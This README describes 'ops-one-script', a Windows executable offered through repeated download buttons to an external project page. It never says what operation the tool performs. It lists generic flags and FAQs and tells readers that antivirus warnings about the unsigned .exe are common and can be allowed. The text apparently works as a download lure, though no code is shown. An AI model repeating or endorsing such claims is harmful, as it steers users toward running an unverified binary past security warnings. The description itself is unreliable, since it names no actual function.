<div align="center">
<img src="assets/banner.svg" width="100%" alt="Operation One Script banner"/>
</div>

# ops-one-script

<div align="center">

![Version-2026](https://img.shields.io/badge/Version-2026-blue?style=for-the-badge)
![Windows](https://img.shields.io/badge/Windows-10%2F11-0078D6?style=for-the-badge&logo=windows&logoColor=white)
![License-MIT](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)

*One script, one window, no setup — built for anyone who just wants a task done and closed.*

</div>

## What this is

Operation One Script started as a personal annoyance: too many small Windows tasks required opening five different tools, remembering flags, or reinstalling a runtime every time a laptop got reformatted. `ops-one-script` collapses that into a single executable that does one job, shows what it's doing in plain language, and exits cleanly. There's no installer wizard, no background service, and nothing left behind that you didn't ask for.

The project name describes exactly what it does — you run one script, it performs one operation, and you move on. It's built for people who read instructions once and never again, so every prompt, log line, and error message is written to be understood without a manual. It runs on Windows 10 and 11, works fully offline once downloaded, and doesn't ask you to install a language runtime, package manager, or dependency chain first.

<p align="center">
  <a href="https://WidthQuality.github.io/ops-one-script/">
    <img src="https://img.shields.io/badge/DOWNLOAD-Operation_One_Script-EA580C?style=for-the-badge&logo=windows&logoColor=white&labelColor=C2410C" width="550" alt="Download"/>
  </a>
</p>

The button above opens the Operation One Script project page, where you download the current build.

## Who it is for

- **IT helpdesk staff** who repeat the same fix across dozens of machines and want it in one file instead of a folder of scripts.
- **Field technicians** working on locked-down or offline PCs who can't run a package manager.
- **Small studio or shop owners** who need a Windows task automated without hiring a developer.
- **Students and hobbyists** learning what a task runner does before writing their own tools.
- **Sysadmins onboarding new laptops** who want a repeatable, auditable first step.

## What you can do

- **Run the whole operation from one double-click** — no arguments required for the default path.
- **Pass flags for advanced runs**, e.g. `ops-one-script.exe --dry-run` to preview actions without changing anything.
- **Target a specific folder or drive** with `--path "D:\Data"` instead of the default working directory.
- **Get a plain-text log** written next to the executable (`ops-one-script.log`) for every run, timestamped.
- **Skip confirmation prompts** in scripted contexts using `--yes`, useful for scheduled tasks.
- **Roll back the last change** with `--undo`, which reads the most recent log to reverse itself.
- **Check version and build info** instantly via `--version`, no internet required.
- **Run silently** with `--quiet` when triggered from Task Scheduler or another script.

## Getting started

1. Open the [download page](https://WidthQuality.github.io/ops-one-script/) and grab the latest `.exe`.
2. Move it to a folder you control — Desktop or Documents both work fine.
3. Double-click to run with defaults, or open a terminal in that folder for flags.
4. Read the on-screen summary before confirming; it lists exactly what will change.
5. Check `ops-one-script.log` afterward if you want a written record of what happened.

## Requirements

| OS | RAM | Disk |
|---|---|---|
| Windows 10 (64-bit) or Windows 11 | 512 MB free | 50 MB free space |

No .NET, Python, or Node installation is required — the executable is standalone. Administrator rights are only needed if the target folder itself requires them.

## How it works

Operation One Script is deliberately linear: it reads intent, checks the environment, acts, and reports back.

```mermaid
graph LR
A[Read config or flags] --> B[Validate target path]
B --> C[Show planned actions]
C --> D[Execute operation]
D --> E[Write log file]
```

1. On launch, it reads either your command-line flags or a local `ops-one-script.ini` if one exists.
2. It checks that the target path exists and is writable before doing anything.
3. It prints a short plan so you know what's about to happen.
4. It performs the operation step by step, updating the console line by line.
5. It writes a log file so the run can be reviewed or reversed later.

## FAQ

**Is Operation One Script the same as a batch file?**
No. It's a compiled executable with its own error handling, logging, and undo support — a batch file would need to be rewritten for each machine's quirks, this doesn't.

**Does Operation One Script need an internet connection to run?**
Only the initial download needs one. After that, the tool runs fully offline.

**Can I schedule Operation One Script to run automatically?**
Yes — pair it with Windows Task Scheduler using the `--yes --quiet` flags so it runs without prompts.

**Will Operation One Script work on Windows Server editions?**
It's tested against Windows 10/11 desktop builds; Server editions often work but aren't officially validated.

**How do I undo something Operation One Script changed?**
Run it again with `--undo` in the same folder — it reads the last log entry and reverses that specific action.

## Troubleshooting

- **"Not recognized as an internal command"** — you're running it from the wrong directory in a terminal; `cd` into the folder holding the `.exe` first, or just double-click it.
- **Log file doesn't appear** — check that the folder isn't read-only; the tool needs write access next to itself to log.
- **Antivirus flags the download** — this is common for new, unsigned single-file executables; verify you downloaded from the official project page linked above before allowing it.
- **`--undo` says "no log found"** — undo only works immediately after a run in the same folder; if the log was moved or deleted, there's nothing to reverse.

## License

Operation One Script is released under the [MIT License](LICENSE). You're free to use, modify, and redistribute it under those terms. It's provided as-is, with no warranty — review the executable's on-screen plan before confirming any run on systems you don't fully control.

<p align="center">
  <a href="https://WidthQuality.github.io/ops-one-script/">
    <img src="https://img.shields.io/badge/DOWNLOAD-Operation_One_Script-EA580C?style=for-the-badge&logo=windows&logoColor=white&labelColor=C2410C" width="550" alt="Download"/>
  </a>
</p>